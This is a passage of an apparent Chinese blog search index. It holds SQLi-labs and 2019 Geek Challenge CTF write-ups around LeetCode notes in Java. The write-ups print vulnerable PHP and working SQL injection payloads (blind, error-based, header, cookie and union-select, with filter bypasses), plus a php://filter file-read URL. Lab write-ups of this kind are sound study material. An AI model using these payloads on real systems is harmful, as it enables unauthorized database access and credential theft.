#&amp;passwd=1 这种写法就要好一点，只需要查询返回的列相同就行 Less-16：好像是Hackbar出问题了，POST提交方式提交不上去(搞清楚了，不是hackbar的问题，如果使用hackbar的POST提交方式要将所有的参数写全) 源代码如下，因为注释了登录信息，还使用@符号抑制了sql语句报错，所以不会有任何回显，使用盲注爆破。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; //echo &quot;Try again looser&quot;; //print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; 12payload: uname=1&quot;) and 1=2 union select 1,sleep(5) #&amp;passwd=1 : uname=Dhakkan&quot;) and if(length(database())=8, sleep(5), 1) #&amp;passwd=1 把上面的sleep函数换成if判断语句就可以进行爆破了，但是盲注脚本还是没有写，懒狗一条，先学学sqlmap的使用方式（学玩就写） Less-17/18Less-17：基于更新语句的报错注入，审源码逻辑。有一个check_input函数，作用是去掉转意的反斜杠，确保uname没有sql注入，但是还要研究研究这个函数，感觉这关主要就是学习这个check_input函数。在检查uname之后，进行查询 关于Mysql中的update语句，如果后面不加限制条件，那么改变的是整个表的值，后面可以接and跟我们需要的报错语句，如果源代码中没有没收报错回显，那么就可以成功使用报错注入。但是这道题有个条件，那就是用户名必须存在。 1payload: uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)), 1) # Less-18：头部报错注入，使用代理提交，估计是想让我们使用burpsuite抓包修改头部代理 需要了解的知识：User Agent 这关开始的源代码写得有点意思，check_input函数没有啥变化，对uname和passwd做了处理，所以这两个参数没有了sql注入的可能性。 这一关的前提是需要知道用户的账号和密码，可以通过前面的关卡注入出来，就不过多赘述。继续审代码，发现代码的逻辑是获取用户的IP和Uagent插入到表uagents中，且参数Uagent没有做任何处理，所以存在sql注入。 首先可以自定义插入数据: 1payload: 111&#x27;, &#x27;127.0.0.1&#x27;, &#x27;hack&#x27;) # 自定义插入数据那就是有机会进行二次注入，但是这一关是让我们直接使用报错注入来获取数据库的所有信息，所以需要另外想办法。 这里直接在uagent变量后面比和单引号，然后拼接报错语句。 1payload: 1&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) , 1, 1) # 这一关感觉就是教你如何在insert语句下使用报错注入，修改uagent之类的抓包修改都还比较简单。 Less-19/20Less-19：需要首先了解的知识Referer （中文翻译叫引荐人）-&gt; HTTP 请求的头信息里面，Referer 是一个常见字段，提供访问来源的信息。 其他感觉和18关差不多，都是insert语句报错注入，唯一的不同点就是修改的数据段为referer段，18关修改的是User-Agent段 1payload: 1&#x27; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) ,1 ,1) # Less-20：Cookie注入 登录进去后会显示Cookie信息 ​ 没啥思路，看源码学习 首先还是对uname和passwd做了过滤，所有这两个参数不存在注入点，需要查找另外的注入点，通过一番抓包调试发现了注入点 1234567891011121314151617181920&lt;? $sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your ID:&#x27; .$row[&#x27;id&#x27;]; &#125;?&gt; 1测试payload: admin&#x27; and 1=2 union select 1,2,3 # 可以看到已经能够控制回显了，但是这关是要我们使用报错注入，所以方法没有对，使用报错注入来过关。 这里还有一个疑问，那就是有一个I LOVE COOKIE那个页面是怎么出来的也需要思考下。 1报错注入payload: admin&#x27; and updatexml(1, concat(0x7e,(select version()), 0x7e), 1) # 得到回显页面，其他的数据通过替换select version()语句得到其他信息。 EndingSQLi-labs的基础关算是弄完了，但是有很多细节还没有深究，比如有很多关卡不止一种方式注入，还有很多的注入姿势没有学到，还要花时间研究研究。","categories":[],"tags":[]},{"title":"leetcode刷题记录-2","slug":"LeetCode/leetcode2","date":"2021-07-14T04:44:17.510Z","updated":"2021-08-08T09:29:40.505Z","comments":true,"path":"37154/","link":"","permalink":"http://example.com/37154/","excerpt":"","text":"Hanota 经典递归问题，从这道题学到的关于递归的思想挺多的 123456789101112131415class Solution &#123; public void move(int size, List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)&#123; if (size == 1)&#123; C.add(A.remove(A.size() - 1)); return; &#125; move(size - 1, A, C, B); C.add(A.remove(A.size() - 1)); move(size - 1, B, A, C); &#125; public void hanota(List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C) &#123; move(A.size(), A, B, C); &#125;&#125; Plaint 经典的dfs问题，好像有一个比较高大上的名字叫做漫水算法？ 12345678910111213141516171819202122232425262728class Solution &#123; public void dfs(int[][] image, int[][] sign, int sr, int sc, int newColor)&#123; if (sign[sr][sc] == 1)&#123; return; &#125; int[][] step = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;&#125;; int width = image.length; int length = image[0].length; sign[sr][sc] = 1; int temp = image[sr][sc]; image[sr][sc] = newColor; for (int i = 0; i &lt; 4; i++) &#123; int row = sr + step[i][0]; int col = sc + step[i][1]; if (row &gt;= width || row &lt; 0 || col &gt;= length || col &lt; 0 || sign[row][col] == 1 || temp != image[row][col])&#123; continue; &#125; dfs(image, sign, row, col, newColor); &#125; &#125; public int[][] floodFill(int[][] image, int sr, int sc, int newColor) &#123; int[][] sign = new int[image.length][image[0].length]; dfs(image, sign ,sr, sc, newColor); return image; &#125;&#125; 岛屿数量 刷LeetCode第一次一遍过😁 判断是否为水，或判断标记是否走过 dfs确定连在一起的岛的范围 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; int height = 0; int width = 0; // 上下左右改变 int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; public void numIslandsDfs(char[][] grid, int row, int col, int[][] book)&#123; //如果越界就返回 if (row &lt; 0 || row &gt;= height || col &lt; 0 || col &gt;= width)return; // 如果是水域或者该点已经走过也返回 else if (grid[row][col] == &#x27;0&#x27; || book[row][col] == 1)return; book[row][col] = 1; for (int i = 0; i &lt; 4; i++) &#123; int post_x = row + step[i][0]; int post_y = col + step[i][1]; numIslandsDfs(grid, post_x, post_y, book); &#125; &#125; public int numIslands(char[][] grid) &#123; /* * 不用直接判断孤岛 * 从0开始检索，如果book数组中没有标记且是陆地，则标记book * 开始dfs检索 * */ int count = 0; height = grid.length; width = grid[0].length; int book[][]= new int[grid.length][grid[0].length]; // 两层for循环来遍历所有坐标 for (int i = 0; i &lt; height; i++) &#123; for (int j = 0; j &lt; width; j++) &#123; // 如果该坐标为水域或者标记为1就忽略 if (grid[i][j] == &#x27;0&#x27; || book[i][j] == 1) &#123; continue; &#125;else &#123; numIslandsDfs(grid, i, j, book); count++; &#125; &#125; &#125; return count; &#125;&#125; 矩阵中的路径 1234567思路如下将返回值设置为false如果dfs出一个完整的单词链则将返回值设置为true，并且直接break遍历表，只对应单词的首字符首字母存在就直接进行dfs遍历，遍历的方向只有四个方向回溯，如果道路不符合需要把之前走过的路全部清0 第一次写的代码最后三个检测点死活不能过，下面贴第一次写的代码 12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; int height = 0; int width = 0; boolean objRet = false; public void existDfs(char[][] board, int row, int col, int[][] book, char[] wordArray, int wordIndex)&#123; if (wordIndex == wordArray.length)&#123; this.objRet = true; return; &#125; if (row &gt;= height || row &lt; 0 || col &gt;= width || col &lt; 0 ) return; else if (book[row][col] == 1 || board[row][col] != wordArray[wordIndex]) return; book[row][col] = 1; wordIndex++; for (int i = 0; i &lt; 4; i++) &#123; int post_x = step[i][0] + row; int post_y = step[i][1] + col; existDfs(board, post_x, post_y, book, wordArray, wordIndex); &#125; book[row][col] = 0; &#125; public boolean exist(char[][] board, String word) &#123; char[] wordArray = word.toCharArray(); height = board.length; width = board[0].length; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[0].length; j++) &#123; if (board[i][j] == wordArray[0])&#123; int[][] book = new int[height][width]; // 开始进行dfs搜索，如果搜索成功就将ret赋值为true existDfs(board,i,j,book,wordArray,0); // 判断在进行dfs后是否找到矩阵中相应单词 &#125; &#125; &#125; return this.objRet; &#125;&#125; 第二次写的代码，虽然过了，但是效率也太低了。。。服了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution &#123; int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; int height = 0; int width = 0; public boolean existDfs(char[][] board, int row, int col, int[][] book, char[] wordArray, int wordIndex)&#123; if (row &gt;= height || row &lt; 0 || col &gt;= width || col &lt; 0)return false; else if (board[row][col] != wordArray[wordIndex] || book[row][col] == 1)return false; if (wordIndex == wordArray.length-1)return true; boolean ret = false; for (int i = 0; i &lt; 4; i++) &#123; int post_x = step[i][0] + row; int post_y = step[i][1] + col; book[row][col] = 1; ret = existDfs(board, post_x, post_y, book, wordArray, wordIndex+1); if (ret == true)break; book[row][col] = 0; &#125; return ret; &#125; public boolean exist(char[][] board, String word) &#123; /* * 首先将返回值设置为false * 如果dfs出一个完整的单词链则将返回值设置为true，并且直接break * * 首先需要遍历表，只对应单词的首字符 * 首字母存在就直接进行dfs遍历 * 遍历的方向只有四个方向 * 还需要回溯，如果道路不符合需要把之前走过的路全部清0 * */ char[] wordArray = word.toCharArray(); height = board.length; width = board[0].length; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[0].length; j++) &#123; int[][] book = new int[height][width]; if (existDfs(board,i,j,book,wordArray,0))&#123; return true; &#125; &#125; &#125; return false; &#125;&#125; 解码异或后的数组 简单的签到题 1234567891011class Solution &#123; public int[] decode(int[] encoded, int first) &#123; int decodedLength = encoded.length + 1; int[] decoded = new int[decodedLength]; decoded[0] = first; for (int i = 0; i &lt; encoded.length; i++) &#123; decoded[i+1] = encoded[i] ^ decoded[i]; &#125; return decoded; &#125;&#125; 数组异或操作 两天都是简单的签到题？感觉这道题随便都可以跑到100% 123456789class Solution &#123; public int xorOperation(int n, int start) &#123; int retNum = start; for (int i = 1; i &lt; n; i++) &#123; retNum ^= start+i*2; &#125; return retNum; &#125;&#125; 螺旋矩阵Ⅰ开始螺旋矩阵三部曲冲冲冲🐱‍🏍 经典题目，学C语言的时候看过没写过，写关于矩阵的东西需要找到矩阵变化规律。 网上找的图，就是把四条边动态化（反正这个思路我是想不出来）。矩阵的上下两条边对应，左右两条边对应，一边在加则另一边减，直到两条边重合。 123思路:定义矩阵的四条边每当遍历完一层这条边就减1 123456789101112131415161718192021222324252627282930313233class Solution &#123; public List&lt;Integer&gt; spiralOrder(int[][] matrix) &#123; /* * 定义四个边界 * 两两对应 * 一边加就一边减*/ int up = 0,down = matrix.length - 1; int left = 0,right = matrix[0].length - 1; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); while (true)&#123; for (int i = left; i &lt;= right; i++) &#123; list.add(matrix[up][i]); &#125; if (++up&gt;down)break; for (int i = up; i &lt;= down; i++) &#123; list.add(matrix[i][right]); &#125; if (--right &lt; left)break; for (int i = right; i &gt;= left ; i--) &#123; list.add(matrix[down][i]); &#125; if (--down &lt; up)break; for (int i = down; i &gt;= up ; i--) &#123; list.add(matrix[i][left]); &#125; if (++left &gt; right)break; &#125; return list; &#125;&#125; 螺旋矩阵Ⅱ 和螺旋矩阵Ⅰ的思路是一样的 12345678910111213141516171819202122232425262728293031class Solution &#123; public int[][] generateMatrix(int n) &#123; int left = 0,right = n - 1; int up = 0, down = n - 1; int[][] matrix = new int[n][n]; int num=1; while (true)&#123; for (int i = up; i &lt;= right; i++) &#123; matrix[up][i] = num++; &#125; if (++up&gt;down)break; for (int i = up; i &lt;= down ; i++) &#123; matrix[i][right] = num++; &#125; if (--right &lt; left)break; for (int i = right; i &gt;= left ; i--) &#123; matrix[down][i] = num++; &#125; if (--down &lt; up)break; for (int i = down; i &gt;= up ; i--) &#123; matrix[i][left] = num++; &#125; if (++left&gt;right)break; &#125; return matrix; &#125;&#125; 螺旋矩阵Ⅲ 两种思路： 和上面的思路一样，动态模拟四条边 找规律，通过观察可知，每次右移和下移走的步数是奇数，左移和上移走的步数是偶数，所以可以以起始点为中心（上图其实都表示出来了），定义一个正方形，遍历这个正方形的所有坐标，如果坐标范围在矩形内，则符合条件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class Solution &#123; public boolean checkPost(int R,int C,int r0,int c0)&#123; if (r0&gt;=R || r0&lt;0 || c0&gt;=C || c0&lt;0) return false; else return true; &#125; public int[][] spiralMatrixIII(int R, int C, int r0, int c0) &#123; // 输入参数，矩阵宽高，起始位置 /* * 将不规则矩阵看成正方形 * 模拟上下左右边界 * 单独设置一个技术变量判断是否遍历完成 * 遍历方向：右，下，左，上*/ int[][] arr = new int[R*C][2]; int num = 0; int max = R&gt;=C?R:C; arr[num][0] = r0; arr[num][1] = c0; for (int i = 1; i &lt;= max*2; i+=2) &#123; for (int j = 1; j &lt;= i; j++) &#123; c0+=1; if (checkPost(R,C,r0,c0))&#123; ++num; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt;= i; j++) &#123; r0 += 1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt; i+2; j++) &#123; c0 -=1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt; i+2; j++) &#123; r0 -= 1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; &#125; return arr; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"}]},{"title":"leetcode刷题记录-1","slug":"LeetCode/leetcode1","date":"2021-07-14T04:44:17.510Z","updated":"2021-08-08T09:29:46.724Z","comments":true,"path":"41353/","link":"","permalink":"http://example.com/41353/","excerpt":"","text":"towsum 123456789101112public int[] twoSum(int[] nums, int target) &#123; int[] index = new int[2]; for (int i = 0; i &lt; nums.length; i++) &#123; for (int j = 0; j &lt; nums.length; j++) &#123; if (nums[i] + nums[j] == target &amp;&amp; i != j) &#123; index[0] = i; index[1] = j; &#125; &#125; &#125; return index; &#125; hashMap 上面的方法在时间复杂堵上为O(n*n)，在数据过大时十分暴力，可以采用哈希表来检索 reverse 看到别人的做法才感觉好厉害，思路非常灵活。 这种根据原理判断整数是否溢出虽然比较科学，但感觉没有榜一大哥那么有灵性 12345678910111213141516public int reverse(int x) &#123; int ret = 0; while(x != 0)&#123; // 先判断倒序数字是否满足条件 if(ret&gt;Integer.MAX_VALUE/10 || (ret==Integer.MAX_VALUE/10 &amp;&amp; x&gt;7))&#123; return 0; &#125; if(ret&lt;Integer.MIN_VALUE/10 || (ret==Integer.MIN_VALUE/10 &amp;&amp; x&lt;-8))&#123; return 0; &#125; ret = ret*10+x%10; x /= 10; &#125; return ret; &#125; isPalindrome 这道题和上面将数字倒序的思想是一样的 12345678910111213141516public boolean isPalindrome(int x)&#123; // 判断负数 if(x&lt;0)&#123; return false; &#125;else &#123; int temp = x, cmpNum=0; while (temp != 0)&#123; cmpNum = cmpNum*10 + temp%10; temp /= 10; &#125; if(cmpNum==x)&#123; return true; &#125; return false; &#125; &#125; romanToInt 这道题也可以用打表的思路，将不能单个字符表示的罗马数字全部穷举出来，这里只有6组，然后上哈希表 124, 9, 40, 90, 400, 900IV IX XL XC CD CM 从右到左来切割判断 123456789101112131415161718192021public int romanToInt(String s) &#123; int ret = 0; String[] strArr = &#123;&quot;I&quot;,&quot;IV&quot;,&quot;V&quot;,&quot;IX&quot;,&quot;X&quot;,&quot;XL&quot;,&quot;L&quot;,&quot;XC&quot;,&quot;C&quot;,&quot;CD&quot;,&quot;D&quot;,&quot;CM&quot;,&quot;M&quot;&#125;; int[] num = &#123;1,4,5,9,10,40,50,90,100,400,500,900,1000&#125;; HashMap&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; strArr.length; i++) &#123; map.put(strArr[i],num[i]); &#125; for (int i = 0; i &lt; s.length();) &#123; if (i+2&lt;=s.length() &amp;&amp; (map.containsKey(s.substring(i,i+2))))&#123; ret += map.get(s.substring(i,i+2)); i += 2; continue; &#125; ret += map.get(s.substring(i,i+1)); i += 1; &#125; return ret; &#125; largestNumber 这道题折磨了一天，需要用到别人感觉并不复杂但是我看不懂的数学证明，所以数学证明是不可能证明的，用字符串解决 1234567891011121314151617181920212223242526public String largestNumber(int[] nums)&#123; /// 不能用顺序排列 /// 数字排序和字符串排序思路都不同 int n = nums.length; String[] numStr = new String[n]; for (int i = 0; i &lt; n; i++) &#123; numStr[i] = String.valueOf(nums[i]); &#125; /// compareTo返回前字符串比较字符ASCII与后字符串比较字母ASCII的差值 Arrays.sort(numStr,(a, b)-&gt;&#123; // 使用lambda重写sort函数，使其字符串逆序排序 return (b+a).compareTo(a+b); // 如果后面加起来比前面大的话，返回1 // 否则返回0 &#125;); System.out.println(Arrays.toString(numStr)); if(numStr[0].equals(&quot;0&quot;))&#123; return &quot;0&quot;; &#125; StringBuilder ret = new StringBuilder(); for (int i = 0; i &lt; numStr.length; i++) &#123; ret.append(numStr[i]); &#125; return ret.toString(); &#125; 黑白方格画 一道纯考排列组合的数学题，两年没有碰过这些考智商的东西，脑袋没转过弯来，虽然里面包含的数学知识也不是很复杂， 12345678910111213141516171819202122232425public int factorial(int a)&#123; if(a == 1 || a == 0) return 1; return factorial(a-1)*a; &#125; public int combine(int n, int a)&#123; return factorial(n)/(factorial(a)*factorial(n-a)); &#125; public int paintingPlan(int n, int k) &#123; if (n*n == k)&#123; return 1; &#125;else if(n &gt; k)&#123; return 0; &#125; int ret = 0; for(int a=0; a&lt;=n; a++)&#123; for(int b=0; b&lt;=n; b++)&#123; if(k == n*(a+b)-a*b)&#123; ret += combine(n, a)*combine(n, b); &#125; &#125; &#125; return ret; &#125; 跳水板 &amp;&amp; 青蛙跳台阶 这道题如果用纯递归的方法去做属实不行，时间复杂度太高了&lt;O(2^n)&gt;，斐波那契数列的性质是一样的，前面两个数决定后一个数，动态规划 递归方法 12345public int divingBoard(int shorter, int longer, int k)&#123; if (k &lt; 0)return 0; if (k == 0)return 1; return climb(shorter, longer, k - 1) + climb(shorter, longer, k - 2); &#125; 非递归方法 1234567891011121314public int[] divingBoard(int shorter, int longer, int k) &#123; if(k == 0)&#123; return new int[0]; &#125; else if (shorter == longer)&#123; int[] ret = &#123;shorter * k&#125;; return ret; &#125; int[] board = new int[k + 1]; int shortest = k * shorter; for (int i = 0; i &lt; k + 1; i++) &#123; board[i] = shortest + i * (longer - shorter); &#125; return board; &#125; 重要的员工 123456789101112131415161718192021222324252627282930313233public int retSubImp(Employee pre, List&lt;Employee&gt; employees)&#123; if (pre.subordinates.isEmpty())&#123; return 0; &#125; int imp = 0; for (Integer sub : pre.subordinates) &#123; for (Employee employee : employees ) &#123; if (sub == employee.id)&#123; imp += employee.importance; imp += retSubImp(employee, employees); &#125; &#125; &#125; return imp; &#125; public int getImportance(List&lt;Employee&gt; employees, int id) &#123; int imp = 0; for (Employee staff : employees) &#123; if (staff.id == id)&#123; imp += staff.importance; for (Integer subid : staff.subordinates) &#123; imp += retSubImp(staff, employees); break; &#125; &#125; &#125; return imp; &#125; 扫雷 这道题有点好玩😛，dfs搜索一共三个步骤 判断该坐标是否为雷，如果是雷就直接结束游戏 如果不是雷，判断坐标周围雷的个数，如果个数不为0，则标记雷的个数，结束游戏 如果周围没有雷，则递归检索周围没有越界的坐标 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int width;int height;int countBomb = 0;int[][] step = &#123;&#123;1, 0&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;0, -1&#125;, &#123;-1, -1&#125;, &#123;-1, 1&#125;, &#123;1, -1&#125;, &#123;1, 1&#125;&#125;;char[] dic = &#123;&#x27;0&#x27;, &#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;&#125;;public void updateBoardDfs(char[][] board, int x, int y, int[][] sign)&#123; if (x &gt;= height || x &lt; 0 || y &gt;= width || y &lt; 0 || sign[x][y] == 1)&#123; return; &#125; // 首先判断周围8个方向是否有雷 getCountBomb(board, x, y); if (countBomb != 0)&#123; board[x][y] = dic[countBomb]; countBomb = 0; return; &#125; // 八个方向 for (int i = 0; i &lt; 8; i++) &#123; int post_x = x + step[i][0]; int post_y = y + step[i][1]; board[x][y] = &#x27;B&#x27;; sign[x][y] = 1; updateBoardDfs(board, post_x, post_y, sign); &#125;&#125;public void getCountBomb(char[][] board, int x, int y)&#123; for (int i = 0; i &lt; 8; i++) &#123; int post_x = x + step[i][0]; int post_y = y + step[i][1]; if (post_x &gt;= height || post_x &lt; 0 || post_y &gt;= width || post_y &lt; 0) continue; if (board[post_x][post_y] == &#x27;M&#x27;) countBomb++; &#125;&#125;/* * 判断点击是否为雷 * 检索周围8个方向是否有雷，无雷标记为B * 有雷标检索有雷个数，然后标记数字 * */public char[][] updateBoard(char[][] board, int[] click)&#123; width = board[0].length; height = board.length; int[][] sign = new int[height][width]; // 玩家点击矩阵坐标 char playerClickPot = board[click[0]][click[1]]; if (playerClickPot == &#x27;M&#x27;)&#123; board[click[0]][click[1]] = &#x27;X&#x27;; &#125;else &#123; updateBoardDfs(board, click[0], click[1], sign); &#125; return board;&#125; 在D天内送达包裹的能力 看题解打卡下班 12345678910111213141516171819202122232425class Solution &#123; public int shipWithinDays(int[] weights, int D) &#123; int left = Arrays.stream(weights).max().getAsInt(); int right = Arrays.stream(weights).sum(); while (left &lt; right)&#123; int middle = (left+right) &gt;&gt; 1; int needDay = 1; int sum = 0; for (int goodWeight : weights)&#123; if (sum + goodWeight &gt; middle)&#123; needDay++; sum = 0; &#125; sum += goodWeight; &#125; if (needDay &lt;= D)&#123; right = middle; &#125; else &#123; left = middle + 1; &#125; &#125; return right; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"http://example.com/tags/LeetCode/"}]},{"title":"2019极客大挑战web","slug":"CTF/wp/极客大挑战2019","date":"2021-07-14T04:44:17.040Z","updated":"2021-08-08T09:30:32.837Z","comments":true,"path":"6345/","link":"","permalink":"http://example.com/6345/","excerpt":"","text":"[极客大挑战 2019]EasySQL万能密码直接出 11&#x27; and &#x27;1&#x27; = &#x27;1 [极客大挑战 2019]LoveSQL 首先查出单引号报错 尝试用万能密码登录，发现只是一个无用的值，CMD5网站也无法破解，尝试其他方法 尝试中断注入，联合注入查看其他信息可以看到用到了查询的第2，3个字段 11&#x27; and 1=2 union select 1,2,3 # 获取当前数据库名，回显出当前数据库名为geek 11&#x27; and 1=2 union select 1,database(),version() # 查询数据库里面的表名称 12345# 查询所有表名select table_name from information_schema.tables where table_schema = &#x27;database_name&#x27;# 查询所有列名select column_name from information_schema.columns where table_name= &#x27;表名&#x27; and table_schema= &#x27;数据库名&#x27; 这里需要加上limit限制返回的列数，手工查出geek数据库下只有两个表：geekuser和l0ve1ysq1 11&#x27; and 1=2 union select 1,2,table_name from information_schema.tables where table_schema = &#x27;geek&#x27; limit 0,1 # 查询表的列名，我当时是一个一个查的，看别人wp发现可以一次就全部查出来。。查出三个列名称 1select column_name from information_schema.columns where table_name= &#x27;表名&#x27; and table_schema= &#x27;数据库名&#x27; 11&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; 获取数据库中信息 我先是手工查，后面加了一个where语句条件就直接出了。。运气好，网上师傅wp都是把表中的数据全部荡下来。学习一手 11&#x27; and 1=2 union select 1,username,password from l0ve1ysq1 where username = &#x27;flag&#x27; # 网上师傅的做法，对mysql中的函数一点都不熟悉，边sqli边学mysql函数吧。。 11&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1 # [极客大挑战 2019]BabySQL考点：绕过特殊字符过滤 过滤了or,and,select,union,from这些关键字，用所有关键字用双写绕过，过程和LoveSQL过程一样 [极客大挑战 2019]HardSQL考点：SQL报错注入 过滤了空格，等号，union，and等字符，主要难点在于空格过滤绕过，需要用括号来绕过 爆库 1username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(database()))))%23 爆表 1username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23 爆字段名 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23 查flag 需要用left和right分别查左边和右边，然后个flag拼接 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(left(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(right(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23 1flag&#123;c36b7fc4-a9fe-4d02-97c6-d3c8b35ead69&#125; [极客大挑战 2019]FinalSQLSQL盲注 [极客大挑战 2019]Secret File考点：本地文件包含，PHP伪协议 抓包抓到一个特殊文件，访问目录查看 查看为本地文件包含，但是访问flag.php却什么也没有。使用php://filter协议对文件进行base64编码查看 1访问后缀：secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php flag.php中的内容全部以base64编码的形式输出，在线解码得到flag 